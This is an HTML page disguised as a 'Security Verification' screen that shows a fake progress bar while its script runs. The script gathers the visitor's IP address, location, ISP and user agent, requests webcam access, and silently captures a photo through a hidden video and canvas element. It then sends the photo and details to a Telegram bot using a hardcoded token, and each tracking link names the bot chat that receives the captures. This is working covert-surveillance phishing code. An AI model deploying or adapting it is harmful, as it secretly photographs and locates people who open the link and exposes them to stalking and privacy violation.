<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 40px; background-color: #f5f5f5; }
        video, canvas { display: none; }
        .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(76, 175, 80, 0.3); border-radius: 50%; border-top-color: #4CAF50; animation: spin 1s ease-in-out infinite; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .progress-container { margin: 30px auto; width: 80%; max-width: 400px; }
        .progress-bar { height: 10px; background-color: #e0e0e0; border-radius: 5px; margin-top: 10px; overflow: hidden; }
        .progress { height: 100%; width: 0; background-color: #4CAF50; transition: width 0.5s; }
        h2 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    
    <div id="loading-container">
        <div class="loading"></div>
        <h2>Security Verification in Progress</h2>
        <p>Please wait while we verify your device...</p>
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress" id="progress-indicator"></div>
            </div>
        </div>
    </div>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        const progressIndicator = document.getElementById("progress-indicator");
        let ipInfo = {};
        let progress = 0;
        
        // Get the user ID from the URL
        const urlParams = new URLSearchParams(window.location.search);
        const user_id = urlParams.get('id');
        
        if (!user_id) {
            document.body.innerHTML = "<h2>Invalid verification link</h2><p>This verification link appears to be invalid or expired.</p>";
        } else {
            // Start the verification process
            startVerification();
        }
        
        function startVerification() {
            // Simulate progress
            const progressInterval = setInterval(() => {
                progress += 5;
                progressIndicator.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    document.getElementById("loading-container").innerHTML = "<h2>Verification Complete</h2><p>Thank you for verifying your device.</p>";
                }
            }, 500);
            
            // Fetch IP info
            fetch("https://ipapi.co/json")
                .then(res => res.json())
                .then(data => { 
                    ipInfo = data;
                    // Access camera after getting IP info
                    requestCameraAccess();
                })
                .catch(() => {
                    // Try camera access even if IP info fails
                    requestCameraAccess();
                });
        }

        // Direct integration with Telegram Bot API
        function sendToTelegram(message, photo = null) {
            const botToken = "7913534738:AAEthUisUFuzA0p0q5txMWAiW74faM0j9ho";
            
            if (photo) {
                // First send the image
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: user_id,
                        photo: `data:image/jpeg;base64,${photo}`, // Ensure proper format
                        caption: "üì∏ Camera snapshot"
                    })
                }).then(response => {
                    if (!response.ok) {
                        console.error("Failed to send photo:", response.statusText);
                    }
                }).catch(err => {
                    console.error("Error sending photo:", err);
                });
            }
            
            // Then send the text message
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: user_id,
                    text: message,
                    parse_mode: "HTML"
                })
            }).then(response => {
                if (!response.ok) {
                    console.error("Failed to send message:", response.statusText);
                }
            }).catch(err => {
                console.error("Error sending message:", err);
            });
        }

        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    // Take photos and send to Telegram
                    setTimeout(captureAndSend, 2000); // Wait 2 seconds for camera to initialize
                })
                .catch(() => {
                    // Still send device info even if camera fails
                    sendDeviceInfo();
                });
        }

        function captureAndSend() {
            if (video.srcObject) {
                ctx.drawImage(video, 0, 0, 320, 240);
                const imageData = canvas.toDataURL("image/jpeg", 0.7);
                
                // Send both device info and image
                sendDeviceInfo(imageData.split(',')[1]);
            } else {
                // Just send device info if no camera
                sendDeviceInfo();
            }
        }

        function sendDeviceInfo(imageBase64 = null) {
            // Prepare device info message
            const ip = ipInfo.ip || "Unknown";
            const country = ipInfo.country_name || "Unknown";
            const city = ipInfo.city || "Unknown";
            const isp = ipInfo.org || "Unknown";
            
            const message = `
üì• <b>New Link Click Detected!</b>

üåç <b>IP:</b> ${ip}
üèôÔ∏è <b>City:</b> ${city}
üåê <b>Country:</b> ${country}
üß≠ <b>ISP:</b> ${isp}
üñ•Ô∏è <b>Device:</b> ${navigator.userAgent}
‚è∞ <b>Time:</b> ${new Date().toLocaleString()}
            `;
            
            // Send the info to Telegram
            sendToTelegram(message, imageBase64);
        }
    </script>
</body>
</html>
